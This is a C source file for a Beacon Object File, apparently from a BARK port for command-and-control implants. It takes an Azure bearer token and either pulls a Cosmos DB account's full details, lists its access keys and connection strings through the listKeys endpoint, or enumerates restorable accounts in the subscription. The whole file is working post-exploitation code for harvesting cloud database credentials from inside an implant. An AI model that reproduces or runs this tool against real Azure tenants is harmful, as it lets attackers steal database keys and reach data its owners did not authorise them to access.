/*
 * get_azurerm_cosmos_db_info.c — BARK BOF
 * Get-AzureRMCosmosDBInfo — Query account details, keys, or restorable accounts
 *
 * Args : token, cosmosDbPath, infoType
 *
 * cosmosDbPath : full ARM path, e.g.
 *   /subscriptions/<subId>/resourceGroups/<rg>/providers/Microsoft.DocumentDB/databaseAccounts/<name>
 *
 * infoType     : details | keys | restorable
 *   details    — full account properties (network rules, identity, endpoints, etc.)
 *   keys       — list access keys and connection strings
 *   restorable — list restorable database accounts for the subscription
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    LPWSTR widePath = NULL;
    char  *token        = NULL;
    char  *cosmosDbPath = NULL;
    char  *infoType     = NULL;

    BeaconDataParse(&parser, args, alen);
    token        = BeaconDataExtract(&parser, NULL);
    cosmosDbPath = BeaconDataExtract(&parser, NULL);
    infoType     = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_azurerm_cosmos_db_info <token> <cosmosDbPath> <details|keys|restorable>\n");
        return;
    }
    cosmosDbPath = SAFE_STR(cosmosDbPath);
    infoType     = SAFE_STR(infoType);

    if (MSVCRT$strcmp(infoType, "keys") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMCosmosDBInfo (keys): %s\n", cosmosDbPath);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "%s/listKeys?api-version=2024-11-15", cosmosDbPath);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkPost(L"management.azure.com", widePath, L"POST", "{}", token, "application/json");
    } else if (MSVCRT$strcmp(infoType, "restorable") == 0) {
        const char *sub = MSVCRT$strstr(cosmosDbPath, "/subscriptions/");
        if (!sub) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Cannot parse subscriptionId from path\n");
            return;
        }
        sub += 15;
        char subId[128] = {0};
        int i = 0;
        while (sub[i] && sub[i] != '/' && i < (int)sizeof(subId) - 1) {
            subId[i] = sub[i];
            i++;
        }
        subId[i] = '\0';

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMCosmosDBInfo (restorable) for subscription: %s\n", subId);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/subscriptions/%s/providers/Microsoft.DocumentDB/restorableDatabaseAccounts?api-version=2024-11-15",
            subId);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkGet(L"management.azure.com", widePath, token);
    } else {
        infoType = "details";
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMCosmosDBInfo (details): %s\n", cosmosDbPath);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "%s?api-version=2024-11-15", cosmosDbPath);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkGet(L"management.azure.com", widePath, token);
    }
    HFree(widePath);
}
